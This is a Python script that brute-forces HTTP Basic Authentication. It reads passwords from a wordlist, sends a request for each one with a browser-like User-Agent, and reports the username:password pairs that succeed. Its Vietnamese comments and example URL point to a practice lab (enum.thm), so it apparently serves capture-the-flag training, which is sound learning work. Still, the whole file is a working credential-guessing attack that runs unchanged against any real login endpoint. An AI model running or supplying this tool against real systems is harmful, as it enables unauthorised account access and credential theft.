#!/usr/bin/env python3
import argparse
import base64
import requests
from typing import List

def build_basic_token(username: str, password: str) -> str:
    # Basic <base64(username:password)>
    raw = f"{username}:{password}".encode("utf-8")
    b64 = base64.b64encode(raw).decode("ascii")
    return f"Basic {b64}"

def try_wordlist(url: str, wordlist_path: str, username: str = "test",
                 user_headers: dict | None = None,
                 ok_status: List[int] = [200]) -> None:
    sess = requests.Session()
    base_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) requests/2.x",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        # "Referer": "http://enum.thm/",   # bật nếu cần giống request mẫu
        # "Host": "enum.thm",              # không cần nếu URL đã là http://enum.thm/...
    }
    if user_headers:
        base_headers.update(user_headers)

    hits = []
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            pwd = line.strip()
            if not pwd:
                continue
            headers = dict(base_headers)
            headers["Authorization"] = build_basic_token(username, pwd)
            try:
                r = sess.get(url, headers=headers, timeout=10, allow_redirects=False)
            except requests.RequestException as e:
                print(f"[!] Lỗi mạng với '{pwd}': {e}")
                continue
            if r.status_code in ok_status:
                print(f"[+] HIT {username}:{pwd} -> {r.status_code}")
                hits.append(pwd)
            else:
                print(f"[-] {username}:{pwd} -> {r.status_code}")
    if hits:
        print("\nValid credentials found:")
        for p in hits:
            print(f"{username}:{p}")

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Send GET with Basic Auth from wordlist")
    ap.add_argument("url", help="Đích, ví dụ: http://enum.thm/labs/basic_auth/")
    ap.add_argument("wordlist", help="File chứa từng giá trị (ví dụ: password) mỗi dòng")
    ap.add_argument("--username", default="test", help="Prefix username (mặc định: test)")
    ap.add_argument("--ok", default="200", help="Mã HTTP coi là hợp lệ, ví dụ: 200,204")
    args = ap.parse_args()

    ok_codes = [int(x) for x in args.ok.split(",") if x.strip().isdigit()]
    try_wordlist(args.url, args.wordlist, username=args.username, ok_status=ok_codes)
